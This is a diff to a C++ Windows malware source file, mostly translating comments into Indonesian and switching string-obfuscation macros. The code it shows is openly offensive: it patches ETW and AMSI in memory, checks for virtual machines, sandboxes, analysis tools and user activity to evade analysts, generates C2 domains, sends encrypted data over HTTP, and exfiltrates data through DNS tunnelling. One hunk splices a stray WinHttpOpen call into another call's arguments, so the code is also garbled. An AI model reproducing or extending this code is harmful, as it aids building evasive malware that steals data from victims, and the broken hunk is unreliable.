@@ -82,6 +82,26 @@
 #include <msxml6.h>
 #include <zlib.h>
 #include <ktmw32.h>
+#ifndef __CREATE_TRANSACTION_DECLS_ADDED
+#define __CREATE_TRANSACTION_DECLS_ADDED
+// beberapa sdk / urutan include mungkin tidak mengekspos api transaksi tergantung pada makro.
+#ifdef __cplusplus
+extern "C" {
+#endif
+WINBASEAPI HANDLE WINAPI CreateTransaction(_In_opt_ LPSECURITY_ATTRIBUTES lpTransactionAttributes,
+                                           _In_opt_ LPGUID UOW,
+                                           _In_ DWORD CreateOptions,
+                                           _In_ DWORD IsolationLevel,
+                                           _In_ DWORD IsolationFlags,
+                                           _In_ DWORD Timeout,
+                                           _In_opt_ LPWSTR Description);
+
+WINBASEAPI BOOL WINAPI RollbackTransaction(_In_ HANDLE TransactionHandle);
+WINBASEAPI BOOL WINAPI CommitTransaction(_In_ HANDLE TransactionHandle);
+#ifdef __cplusplus
+}
+#endif
+#endif
 #include <array>
 #include <iostream>
 #include <fstream>
@@ -102,8 +122,10 @@
 #include <algorithm>
 #include <memory>
 #include <cctype>
+#include <cmath>
 #include <intrin.h>
 #include <immintrin.h>
+#include <winhttp.h>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "kernel32.lib")
@@ -142,13 +164,13 @@
 using namespace Gdiplus;
 using namespace std;
 
-// Helper function to convert wstring to string
+// fungsi bantuan untuk mengkonversi wstring ke string
 string to_string(const wstring& ws) {
     return string(ws.begin(), ws.end());
 }
 
 // =====================================================
-// ADVANCED STRING OBFUSCATION WITH RUNTIME DECRYPTION
+// obfuskasi string tingkat lanjut dengan dekripsi runtime
 // =====================================================
 template <typename CharT>
 class StringObfuscator {
@@ -171,14 +193,14 @@ public:
 #define OBFW(str) StringObfuscator<wchar_t>::GetDecryptedString(str)
 
 // =====================================================
-// ADVANCED ANTI-ANALYSIS WITH EDR EVASION
+// anti-analisis tingkat lanjut dengan penghindaran edr
 // =====================================================
 class AdvancedAntiAnalysis {
 private:
     random_device rd;
     mt19937 gen;
     
-    // Hardware fingerprinting
+    // fingerprinting hardware
     struct SystemFingerprint {
         DWORD cpuHash;
         DWORD memoryHash;
@@ -190,7 +212,7 @@ private:
     SystemFingerprint GetSystemFingerprint() {
         SystemFingerprint fingerprint = {0};
         
-        // CPU fingerprint
+        // fingerprint cpu
         int cpuInfo[4] = {-1};
         __cpuid(cpuInfo, 0);
         DWORD maxFunction = cpuInfo[0];
@@ -200,7 +222,7 @@ private:
             fingerprint.cpuHash = cpuInfo[0] ^ cpuInfo[1] ^ cpuInfo[2] ^ cpuInfo[3];
         }
         
-        // Memory fingerprint
+        // fingerprint memori
         MEMORYSTATUSEX memStatus;
         memStatus.dwLength = sizeof(memStatus);
         if (GlobalMemoryStatusEx(&memStatus)) {
@@ -208,10 +230,10 @@ private:
                                       (DWORD)(memStatus.ullAvailPhys / (1024 * 1024));
         }
         
-        // Disk fingerprint
+        // fingerprint disk
         wchar_t systemPath[MAX_PATH];
         GetSystemDirectoryW(systemPath, MAX_PATH);
-        systemPath[3] = 0; // Get drive letter only
+        systemPath[3] = 0; // ambil hanya huruf drive
         
         ULARGE_INTEGER freeBytes, totalBytes, totalFreeBytes;
         if (GetDiskFreeSpaceExW(systemPath, &freeBytes, &totalBytes, &totalFreeBytes)) {
@@ -219,7 +241,7 @@ private:
                                    (DWORD)(freeBytes.QuadPart / (1024 * 1024 * 1024));
         }
         
-        // MAC address fingerprint
+        // fingerprint alamat mac
         IP_ADAPTER_INFO adapterInfo[16];
         DWORD dwBufLen = sizeof(adapterInfo);
         if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
@@ -228,7 +250,7 @@ private:
             }
         }
         
-        // System info fingerprint
+        // fingerprint info sistem
         SYSTEM_INFO sysInfo;
         GetSystemInfo(&sysInfo);
         fingerprint.systemHash = sysInfo.dwNumberOfProcessors ^ sysInfo.dwPageSize ^ sysInfo.dwProcessorType;
@@ -237,7 +259,7 @@ private:
     }
     
     bool CheckETW() {
-        // Check if ETW is tracing our process
+        // cek apakah etw sedang melacak proses kita
         TRACEHANDLE hTrace = 0;
         EVENT_TRACE_PROPERTIES* pTraceProps = nullptr;
         PEVENT_TRACE_PROPERTIES pBuffer = nullptr;
@@ -258,13 +280,13 @@ private:
     }
     
     bool DisableETW() {
-        // Try to disable ETW by patching
+        // coba nonaktifkan etw dengan patching
         PVOID pNtTraceEvent = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
         if (!pNtTraceEvent) return false;
         
         DWORD oldProtect;
         if (VirtualProtect(pNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-            *(BYTE*)pNtTraceEvent = 0xC3; // RET instruction
+            *(BYTE*)pNtTraceEvent = 0xC3; // instruksi RET
             VirtualProtect(pNtTraceEvent, 1, oldProtect, &oldProtect);
             return true;
         }
@@ -279,10 +301,10 @@ private:
         FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
         if (!pAmsiScanBuffer) return false;
         
-        // Try to patch AMSI
+        // coba patch amsi
         DWORD oldProtect;
         if (VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-            *(BYTE*)pAmsiScanBuffer = 0xC3; // RET instruction
+            *(BYTE*)pAmsiScanBuffer = 0xC3; // instruksi RET
             VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);
             return true;
         }
@@ -299,13 +321,13 @@ private:
     }
     
     bool CheckMemoryScans() {
-        // Check for memory scanners by looking for suspicious memory regions
+        // cek memory scanner dengan melihat region memory mencurigakan
         MEMORY_BASIC_INFORMATION mbi;
         PVOID address = 0;
         
         while (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
             if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
-                // Check for executable memory with suspicious names
+                // cek memory executable dengan nama mencurigakan
                 if (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) {
                     char modulePath[MAX_PATH];
                     if (GetModuleFileNameA((HMODULE)mbi.AllocationBase, modulePath, MAX_PATH)) {
@@ -327,12 +349,12 @@ private:
     }
     
     bool CheckTimingAttacks() {
-        // Advanced timing attack detection with multiple methods
+        // deteksi serangan timing tingkat lanjut dengan banyak metode
         const int iterations = 100;
         vector<DWORD> times;
         times.reserve(iterations);
         
-        // Use high-resolution timer
+        // gunakan timer resolusi tinggi
         LARGE_INTEGER frequency;
         QueryPerformanceFrequency(&frequency);
         
@@ -340,7 +362,7 @@ private:
             LARGE_INTEGER start, end;
             QueryPerformanceCounter(&start);
             
-            // Perform some work with CPUID to prevent optimization
+            // lakukan pekerjaan dengan CPUID untuk mencegah optimasi
             volatile int dummy = 0;
             for (int j = 0; j < 1000; j++) {
                 int cpuInfo[4];
@@ -354,7 +376,7 @@ private:
             times.push_back((DWORD)elapsed);
         }
         
-        // Calculate variance
+        // hitung varians
         double mean = 0;
         for (DWORD time : times) {
             mean += time;
@@ -367,10 +389,10 @@ private:
         }
         variance /= iterations;
         
-        // Low variance might indicate emulation
+        // varians rendah mungkin mengindikasikan emulasi
         if (variance < 0.5) return true;
         
-        // Check for consistent timing patterns
+        // cek pola timing yang konsisten
         int consistentCount = 0;
         for (size_t i = 1; i < times.size(); i++) {
             if (abs((int)times[i] - (int)times[i-1]) < 2) {
@@ -378,24 +400,24 @@ private:
             }
         }
         
-        // Too many consistent timings might indicate emulation
+        // terlalu banyak timing konsisten mungkin mengindikasikan emulasi
         return (consistentCount > (int)(times.size() * 0.8));
     }
     
     bool CheckVMAdvanced() {
-        // Check CPUID hypervisor bit with extended leafs
+        // cek bit hypervisor CPUID dengan leaf extended
         int cpuInfo[4] = {-1};
         __cpuid(cpuInfo, 1);
         if ((cpuInfo[2] & (1 << 31)) == 0) return false;
         
-        // Get hypervisor vendor ID
+        // dapatkan vendor ID hypervisor
         __cpuid(cpuInfo, 0x40000000);
         char vendor[13] = {0};
         memcpy(vendor, cpuInfo + 1, 4);
         memcpy(vendor + 4, cpuInfo + 2, 4);
         memcpy(vendor + 8, cpuInfo + 3, 4);
         
-        // Check for known hypervisors
+        // cek hypervisor yang diketahui
         if (strstr(vendor, "KVMKVMKVM") || strstr(vendor, "Microsoft Hv") ||
             strstr(vendor, "VMwareVMware") || strstr(vendor, "XenVMMXenVMM") ||
             strstr(vendor, "prl hyperv") || strstr(vendor, "VBoxVBoxVBox") ||
@@ -403,23 +425,23 @@ private:
             return true;
         }
         
-        // Check for additional hypervisor features
+        // cek fitur hypervisor tambahan
         __cpuid(cpuInfo, 0x40000001);
         uint32_t hypervisorFeatures = cpuInfo[0];
         
-        // Check for specific hypervisor features that indicate VM
-        if (hypervisorFeatures & 0x100) return true; // Hypervisor present
+        // cek fitur hypervisor spesifik yang mengindikasikan VM
+        if (hypervisorFeatures & 0x100) return true; // hypervisor present
         
-        // Check memory size with dynamic threshold
+        // cek ukuran memori dengan threshold dinamis
         MEMORYSTATUSEX memStatus;
         memStatus.dwLength = sizeof(memStatus);
         if (GlobalMemoryStatusEx(&memStatus)) {
-            // Dynamic threshold based on system capabilities
+            // threshold dinamis berdasarkan kemampuan sistem
             ULONGLONG threshold = max(4ULL * 1024 * 1024 * 1024, memStatus.ullTotalPhys / 4);
             if (memStatus.ullTotalPhys < threshold) return true;
         }
         
-        // Check for VM-specific processes with more comprehensive list
+        // cek proses spesifik VM dengan daftar lebih komprehensif
         const vector<wstring> vmProcesses = {
             L"vmtoolsd.exe", L"vmware.exe", L"vmware-tray.exe", L"vmware-user.exe",
             L"vgaservice.exe", L"vboxservice.exe", L"vboxtray.exe",
@@ -451,7 +473,7 @@ private:
         
         if (found) return true;
         
-        // Check for VM-specific files and directories
+        // cek file dan direktori spesifik VM
         const vector<wstring> vmPaths = {
             L"C:\\Program Files\\VMware",
             L"C:\\Program Files\\Oracle\\VirtualBox",
@@ -471,7 +493,7 @@ private:
             }
         }
         
-        // Check MAC address for VM vendors with more patterns
+        // cek alamat MAC untuk vendor VM dengan lebih banyak pola
         IP_ADAPTER_INFO adapterInfo[16];
         DWORD dwBufLen = sizeof(adapterInfo);
         if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
@@ -492,7 +514,7 @@ private:
             }
         }
         
-        // Check for VM-specific registry keys
+        // cek registry key spesifik VM
         const vector<pair<wstring, wstring>> vmRegistryKeys = {
             {L"HARDWARE\\ACPI\\DSDT", L"VBOX__"},
             {L"HARDWARE\\ACPI\\DSDT", L"VMWARE__"},
@@ -523,9 +545,9 @@ private:
     }
     
     bool CheckUserActivityAdvanced() {
-        // Check multiple indicators of user activity
+        // cek banyak indikator aktivitas pengguna
         
-        // Last input time
+        // waktu input terakhir
         LASTINPUTINFO lastInput;
         lastInput.cbSize = sizeof(LASTINPUTINFO);
         if (!GetLastInputInfo(&lastInput)) return false;
@@ -533,10 +555,10 @@ private:
         DWORD tickCount = GetTickCount();
         DWORD inactiveTime = tickCount - lastInput.dwTime;
         
-        // Check for extended inactivity (more than 30 minutes)
+        // cek inaktivitas berkepanjangan (lebih dari 30 menit)
         if (inactiveTime > 1800000) return true;
         
-        // Check mouse movement with multiple samples
+        // cek pergerakan mouse dengan banyak sampel
         POINT p1, p2, p3;
         GetCursorPos(&p1);
         Sleep(5000);
@@ -544,18 +566,18 @@ private:
         Sleep(5000);
         GetCursorPos(&p3);
         
-        // Check if mouse hasn't moved
+        // cek jika mouse belum bergerak
         if (p1.x == p2.x && p1.y == p2.y && p2.x == p3.x && p2.y == p3.y) {
             return true;
         }
         
-        // Check foreground window changes
+        // cek perubahan window foreground
         HWND hwnd1 = GetForegroundWindow();
         Sleep(10000);
         HWND hwnd2 = GetForegroundWindow();
         
         if (hwnd1 == hwnd2) {
-            // Check if window title has changed
+            // cek jika judul window telah berubah
             wchar_t title1[256], title2[256];
             GetWindowTextW(hwnd1, title1, 256);
             GetWindowTextW(hwnd2, title2, 256);
@@ -565,10 +587,10 @@ private:
             }
         }
         
-        // Check for system power state
+        // cek status daya sistem
         SYSTEM_POWER_STATUS powerStatus;
         if (GetSystemPowerStatus(&powerStatus)) {
-            if (powerStatus.BatteryFlag & 8) { // System is running on battery
+            if (powerStatus.BatteryFlag & 8) { // sistem berjalan dengan baterai
                 return true;
             }
         }
@@ -577,7 +599,7 @@ private:
     }
     
     bool CheckSandboxArtifactsAdvanced() {
-        // Check for sandbox-specific registry keys with more comprehensive list
+        // cek registry key spesifik sandbox dengan daftar lebih komprehensif
         const vector<pair<wstring, wstring>> sandboxKeys = {
             {L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", L"C:\\Users\\user\\Desktop"},
             {L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Cache", L"C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache"},
@@ -604,7 +626,7 @@ private:
             }
         }
         
-        // Check for sandbox-specific files with more comprehensive list
+        // cek file spesifik sandbox dengan daftar lebih komprehensif
         const vector<wstring> sandboxFiles = {
             L"C:\\sample.exe", L"C:\\malware.exe", L"C:\\test.exe", L"C:\\analysis.exe",
             L"C:\\sandbox.ini", L"C:\\sandbox.conf", L"C:\\sandboxie.ini",
@@ -621,7 +643,7 @@ private:
             }
         }
         
-        // Check for sandbox-specific environment variables
+        // cek environment variable spesifik sandbox
         const vector<wstring> sandboxEnvVars = {
             L"SANDBOXIE_", L"CUCKOO_", L"JOE_SANDBOX_", L"ANUBIS_",
             L"THREAT_", L"VIRUSTOTAL_", L"ANY.RUN_", L"HYBRID_ANALYSIS_"
@@ -634,14 +656,14 @@ private:
             }
         }
         
-        // Check for sandbox-specific window classes
+        // cek window class spesifik sandbox
         HWND hwnd = FindWindowW(L"SandboxieControlWndClass", NULL);
         if (hwnd) return true;
         
         hwnd = FindWindowW(L"Cuckoo", NULL);
         if (hwnd) return true;
         
-        // Check for sandbox-specific processes with more comprehensive list
+        // cek proses spesifik sandbox dengan daftar lebih komprehensif
         const vector<wstring> sandboxProcesses = {
             L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe",
             L"wireshark.exe", L"dumpcap.exe", L"fiddler.exe", L"httpdebugger.exe",
@@ -677,40 +699,40 @@ private:
     }
     
     bool CheckEnvironmentSpecifics() {
-        // Check system language
+        // cek bahasa sistem
         LANGID langId = GetUserDefaultLangID();
         if (PRIMARYLANGID(langId) == LANG_ENGLISH) {
-            // English systems are more likely to be analysis environments
-            // Check for specific English variants
+            // sistem english lebih mungkin environment analisis
+            // cek varian english spesifik
             if (SUBLANGID(langId) == SUBLANG_ENGLISH_US) {
-                // US English is common in sandboxes
+                // US english umum di sandbox
                 return true;
             }
         }
         
-        // Check timezone
+        // cek timezone
         TIME_ZONE_INFORMATION tzi;
         if (GetTimeZoneInformation(&tzi) != TIME_ZONE_ID_INVALID) {
-            // Check if timezone is set to a common sandbox timezone
+            // cek jika timezone diatur ke timezone sandbox umum
             if (tzi.Bias == 0) { // UTC
                 return true;
             }
         }
         
-        // Check keyboard layout
+        // cek layout keyboard
         HKL currentLayout = GetKeyboardLayout(0);
-        if ((UINT_PTR)currentLayout == 0x00000409) { // US English keyboard
+        if ((UINT_PTR)currentLayout == 0x00000409) { // keyboard US english
             return true;
         }
         
-        // Check for specific installed applications
+        // cek aplikasi terinstal spesifik
         const vector<wstring> analysisApps = {
             L"Wireshark", L"Process Monitor", L"Process Explorer", 
             L"ProcMon", L"ProcExp", L"OllyDbg", L"IDA Pro", 
             L"x64dbg", L"Fiddler", L"HTTPDebugger"
         };
         
-        // Check uninstall keys for these applications
+        // cek uninstall key untuk aplikasi ini
         const vector<wstring> uninstallKeys = {
             L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
             L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
@@ -752,21 +774,21 @@ public:
     AdvancedAntiAnalysis() : gen(rd()) {}
     
     bool IsAnalysisEnvironment() {
-        // Add random delay to frustrate automated analysis
+        // tambah delay random untuk mengganggu analisis otomatis
         uniform_int_distribution<> dist(30000, 60000);
-        Sleep(dist(gen)); // 30-60 seconds
+        Sleep(dist(gen)); // 30-60 detik
         
-        // Check for ETW and disable if found
+        // cek ETW dan nonaktifkan jika ditemukan
         if (CheckETW()) {
             DisableETW();
         }
         
-        // Check for AMSI and disable if found
+        // cek AMSI dan nonaktifkan jika ditemukan
         if (CheckAMSI()) {
-            // AMSI disabled
+            // AMSI dinonaktifkan
         }
         
-        // Perform comprehensive checks
+        // lakukan pemeriksaan komprehensif
         if (CheckVMAdvanced()) return true;
         if (CheckTimingAttacks()) return true;
         if (CheckMemoryScans()) return true;
@@ -779,12 +801,12 @@ public:
     }
     
     void EvadeAnalysis() {
-        // Introduce random delays and CPU-intensive tasks to frustrate analysis
+        // tambah delay random dan tugas intensive CPU untuk mengganggu analisis
         uniform_int_distribution<> dist(1000, 5000);
         for (int i = 0; i < 5; i++) {
             Sleep(dist(gen));
             
-            // Perform some CPU-intensive work with CPUID to prevent optimization
+            // lakukan pekerjaan intensive CPU dengan CPUID untuk mencegah optimasi
             volatile int dummy = 0;
             for (int j = 0; j < 1000000; j++) {
                 int cpuInfo[4];
@@ -793,7 +815,7 @@ public:
             }
         }
         
-        // Additional evasion techniques
+        // teknik penghindaran tambahan
         DisableETW();
         CheckAMSI();
     }
@@ -804,7 +826,7 @@ public:
 };
 
 // =====================================================
-// SECURE CRYPTOGRAPHY IMPLEMENTATION
+// implementasi kriptografi aman
 // =====================================================
 class SecureCrypto {
 private:
@@ -856,36 +878,36 @@ public:
         BCRYPT_KEY_HANDLE hKey = NULL;
         NTSTATUS status;
         
-        // Open algorithm provider
+        // buka provider algoritma
         status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
         if (!NT_SUCCESS(status)) return ciphertext;
         
-        // Set chaining mode
+        // set chaining mode
         status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
         if (!NT_SUCCESS(status)) {
             BCryptCloseAlgorithmProvider(hAlg);
             return ciphertext;
         }
         
-        // Generate key
+        // generate key
         status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), key.size(), 0);
         if (!NT_SUCCESS(status)) {
             BCryptCloseAlgorithmProvider(hAlg);
             return ciphertext;
         }
         
-        // Prepare authentication info
+        // siapkan info autentikasi
         BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
         BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
         authInfo.pbNonce = (PUCHAR)nonce.data();
         authInfo.cbNonce = nonce.size();
         
-        // Allocate space for tag
+        // alokasi space untuk tag
         vector<BYTE> tag(16);
         authInfo.pbTag = tag.data();
         authInfo.cbTag = tag.size();
         
-        // Get output size
+        // dapatkan ukuran output
         ULONG ciphertextSize = 0;
         status = BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), plaintext.size(), &authInfo, NULL, 0, NULL, 0, &ciphertextSize, BCRYPT_BLOCK_PADDING);
         if (!NT_SUCCESS(status)) {
@@ -894,16 +916,16 @@ public:
             return ciphertext;
         }
         
-        // Allocate space for ciphertext
+        // alokasi space untuk ciphertext
         ciphertext.resize(ciphertextSize);
         
-        // Encrypt
+        // enkripsi
         status = BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), plaintext.size(), &authInfo, NULL, 0, ciphertext.data(), ciphertext.size(), &ciphertextSize, BCRYPT_BLOCK_PADDING);
         if (!NT_SUCCESS(status)) {
             ciphertext.clear();
         }
         
-        // Prepend nonce and tag to ciphertext
+        // tambah nonce dan tag di depan ciphertext
         vector<BYTE> result;
         result.insert(result.end(), nonce.begin(), nonce.end());
         result.insert(result.end(), tag.begin(), tag.end());
@@ -923,11 +945,11 @@ public:
             return plaintext;
         }
         
-        if (ciphertext.size() < 28) { // 12 (nonce) + 16 (tag) + at least 1 byte of ciphertext
+        if (ciphertext.size() < 28) { // 12 (nonce) + 16 (tag) + minimal 1 byte ciphertext
             return plaintext;
         }
         
-        // Extract nonce, tag, and ciphertext
+        // ekstrak nonce, tag, dan ciphertext
         vector<BYTE> nonce(ciphertext.begin(), ciphertext.begin() + 12);
         vector<BYTE> tag(ciphertext.begin() + 12, ciphertext.begin() + 28);
         vector<BYTE> cipher(ciphertext.begin() + 28, ciphertext.end());
@@ -936,25 +958,25 @@ public:
         BCRYPT_KEY_HANDLE hKey = NULL;
         NTSTATUS status;
         
-        // Open algorithm provider
+        // buka provider algoritma
         status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
         if (!NT_SUCCESS(status)) return plaintext;
         
-        // Set chaining mode
+        // set chaining mode
         status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
         if (!NT_SUCCESS(status)) {
             BCryptCloseAlgorithmProvider(hAlg);
             return plaintext;
         }
         
-        // Generate key
+        // generate key
         status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), key.size(), 0);
         if (!NT_SUCCESS(status)) {
             BCryptCloseAlgorithmProvider(hAlg);
             return plaintext;
         }
         
-        // Prepare authentication info
+        // siapkan info autentikasi
         BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
         BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
         authInfo.pbNonce = nonce.data();
@@ -962,7 +984,7 @@ public:
         authInfo.pbTag = tag.data();
         authInfo.cbTag = tag.size();
         
-        // Get output size
+        // dapatkan ukuran output
         ULONG plaintextSize = 0;
         status = BCryptDecrypt(hKey, (PUCHAR)cipher.data(), cipher.size(), &authInfo, NULL, 0, NULL, 0, &plaintextSize, BCRYPT_BLOCK_PADDING);
         if (!NT_SUCCESS(status)) {
@@ -971,10 +993,10 @@ public:
             return plaintext;
         }
         
-        // Allocate space for plaintext
+        // alokasi space untuk plaintext
         plaintext.resize(plaintextSize);
         
-        // Decrypt
+        // dekripsi
         status = BCryptDecrypt(hKey, (PUCHAR)cipher.data(), cipher.size(), &authInfo, NULL, 0, plaintext.data(), plaintext.size(), &plaintextSize, BCRYPT_BLOCK_PADDING);
         if (!NT_SUCCESS(status)) {
             plaintext.clear();
@@ -1009,7 +1031,7 @@ public:
 };
 
 // =====================================================
-// ADVANCED COMMAND AND CONTROL (C2) INFRASTRUCTURE
+// infrastruktur command and control (c2) tingkat lanjut
 // =====================================================
 class AdvancedC2Infrastructure {
 private:
@@ -1034,7 +1056,7 @@ private:
         const wchar_t* domains[] = { L"update", L"cdn", L"api", L"content", L"service", L"cloud", L"data" };
         const wchar_t* subdomains[] = { L"www", L"cdn", L"api", L"content", L"service", L"cloud", L"secure" };
         
-        // Generate domain based on timestamp
+        // generate domain berdasarkan timestamp
         wchar_t dga[256];
         swprintf_s(dga, L"%s%02d%02d%02d%s%02d%s", 
                   subdomains[timeinfo.tm_mday % 7],
@@ -1051,20 +1073,20 @@ private:
     vector<BYTE> EncryptAndHMAC(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // Generate random nonce
+        // generate nonce random
         vector<BYTE> nonce = crypto.GenerateRandomNonce(12);
         
-        // Encrypt data
+        // enkripsi data
         vector<BYTE> encrypted = crypto.EncryptAES_GCM(data, encryptionKey, nonce);
         
-        // Calculate HMAC
-        // In a real scenario, you would use a proper HMAC implementation
+        // hitung HMAC
+        // di skenario nyata, kamu akan menggunakan implementasi HMAP yang proper
         vector<BYTE> hmac(32);
         for (size_t i = 0; i < hmac.size(); i++) {
             hmac[i] = data[i % data.size()] ^ hmacKey[i % hmacKey.size()];
         }
         
-        // Combine nonce, HMAC, and encrypted data
+        // gabung nonce, HMAC, dan data terenkripsi
         vector<BYTE> result;
         result.insert(result.end(), nonce.begin(), nonce.end());
         result.insert(result.end(), hmac.begin(), hmac.end());
@@ -1076,7 +1098,7 @@ private:
     bool SendHTTP(const wstring& domain, const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        HINTERNET hSession = WinHttpOpen(OBF("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36").c_str(), 
+        HINTERNET hSession = WinHttpOpen(OBFW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36").c_str(), 
                                         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                         WINHTTP_NO_PROXY_NAME, 
                                         WINHTTP_NO_PROXY_BYPASS, 0);
@@ -1087,10 +1109,10 @@ private:
         if (!hConnect) {
             WinHttpCloseHandle(hSession);
             return false;
-        }
-        
-        HINTERNET hRequest = WinHttpOpenRequest(hConnect, OBF("POST").c_str(), OBF("/data").c_str(),
-                                               NULL, WINHTTP_NO_REFERER, 
+            HINTERNET hSession = WinHttpOpen(OBFW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36").c_str(),
+                                             WINHTTP_ACCESS_TYPE_NO_PROXY,
+                                             WINHTTP_NO_PROXY_NAME,
+                                             WINHTTP_NO_PROXY_BYPASS, 0);
                                                WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                WINHTTP_FLAG_SECURE);
         if (!hRequest) {
@@ -1099,16 +1121,16 @@ private:
             return false;
         }
         
-        // Add headers
-        wstring headers = OBF("Content-Type: application/octet-stream\r\n");
-        headers += OBF("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n");
-        headers += OBF("X-Custom-Header: ") + GetRandomString(16) + OBF("\r\n");
-        headers += OBF("X-Request-ID: ") + GetRandomString(32) + OBF("\r\n");
+        // tambah headers
+        wstring headers = OBFW(L"Content-Type: application/octet-stream\r\n");
+        headers += OBFW(L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n");
+        headers += OBFW(L"X-Custom-Header: ") + GetRandomString(16) + OBFW(L"\r\n");
+        headers += OBFW(L"X-Request-ID: ") + GetRandomString(32) + OBFW(L"\r\n");
         
         WinHttpAddRequestHeaders(hRequest, headers.c_str(), headers.length(), 
                                 WINHTTP_ADDREQ_FLAG_ADD);
         
-        // Add jitter to avoid pattern detection
+        // tambah jitter untuk menghindari deteksi pola
         uniform_int_distribution<> dist(0, 5000);
         Sleep(dist(gen));
         
@@ -1120,7 +1142,7 @@ private:
         if (bResults) {
             WinHttpReceiveResponse(hRequest, NULL);
             
-            // Read response
+            // baca response
             DWORD dwSize = 0;
             DWORD dwDownloaded = 0;
             vector<BYTE> response;
@@ -1139,9 +1161,9 @@ private:
                 }
             } while (dwSize > 0);
             
-            // Process response if needed
+            // proses response jika perlu
             if (!response.empty()) {
-                // In a real scenario, you would process the response
+                // di skenario nyata, kamu akan memproses response
             }
         }
         
@@ -1160,51 +1182,51 @@ private:
     bool SendDNS(const vector<BYTE>& data) {
         lock_guard<mutex> lock(c2Mutex);
         
-        // This is a simplified DNS tunneling implementation
-        // In a real scenario, you would use a more sophisticated method
+        // ini implementasi DNS tunneling sederhana
+        // di skenario nyata, kamu akan menggunakan metode yang lebih canggih
         
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
         
-        // Create a socket
+        // buat socket
         SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
         if (sock == INVALID_SOCKET) {
             WSACleanup();
             return false;
         }
         
-        // Set up DNS server
+        // setup DNS server
         sockaddr_in dnsServer;
         dnsServer.sin_family = AF_INET;
         dnsServer.sin_port = htons(53);
         
-        // Use multiple DNS servers for redundancy
+        // gunakan banyak DNS server untuk redundancy
         const char* dnsServers[] = { "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1" };
         int serverIndex = rand() % 4;
         dnsServer.sin_addr.s_addr = inet_addr(dnsServers[serverIndex]);
         
-        // Encode data in DNS queries
+        // encode data dalam query DNS
         const size_t maxLabelSize = 63;
         const size_t maxDomainSize = 253;
         
         for (size_t i = 0; i < data.size(); i += maxLabelSize) {
             size_t chunkSize = min(maxLabelSize, data.size() - i);
             
-            // Create DNS query
+            // buat query DNS
             char query[512];
             int queryLen = 0;
             
-            // Create a random subdomain
+            // buat subdomain random
             for (int j = 0; j < 8; j++) {
                 query[queryLen++] = 'a' + (rand() % 26);
             }
             query[queryLen++] = '.';
             
-            // Encode data chunk using base32
+            // encode chunk data menggunakan base32
             for (size_t j = 0; j < chunkSize; j += 5) {
                 size_t bytesToEncode = min(5, chunkSize - j);
                 
-                // Base32 encode 5 bytes at a time
+                // base32 encode 5 bytes sekaligus
                 char encoded[8];
                 memset(encoded, 0, sizeof(encoded));
                 
@@ -1228,7 +1250,7 @@ private:
                     encoded[7] = data[i + j + 4] & 0x1F;
                 }
                 
-                // Convert to base32 alphabet
+                // konversi ke alphabet base32
                 const char base32[] = "abcdefghijklmnopqrstuvwxyz234567";
                 for (int k = 0; k < 8; k++) {
                     if (k < (bytesToEncode * 8 + 4) / 5) {
@@ -1236,25 +1258,25 @@ private:
                     }
                 }
                 
-                // Add a dot every 32 characters
